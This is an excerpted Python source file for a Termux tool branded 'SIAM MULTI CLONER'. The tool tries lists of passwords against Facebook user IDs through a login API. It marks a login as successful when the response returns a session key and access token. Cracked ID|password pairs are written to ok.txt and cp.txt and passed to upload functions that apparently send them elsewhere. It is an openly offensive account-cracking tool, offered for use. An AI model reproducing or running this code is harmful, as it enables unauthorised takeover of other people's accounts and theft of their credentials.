...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER https://m.me/xaiko.siam.12")
	subprocess.check_output(["am", "start", "https://m.me/xaiko.siam.12"])

def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍This tool is offical for SIAM")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/SIAM404-Cyber/S4K1N-APPROVAL/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
##    ##  ##  ##     ## ##     ## 
 ######  #### ##     ## ##     ## 
\033[1;94m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mAUTHOR   : Xaiko Siam
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : AMINUL ISLAM
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : K14NG-S14M
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mVERSION  : 2.0.2
\033[1;94m═══════════════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sSIAM MULTI CLONER"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SIAM] : %s/%s -> \033[0;92m [ SIAM-OK:%s ]- \033[0;91m[SIAM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [SIAM-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SIAM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SIAM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
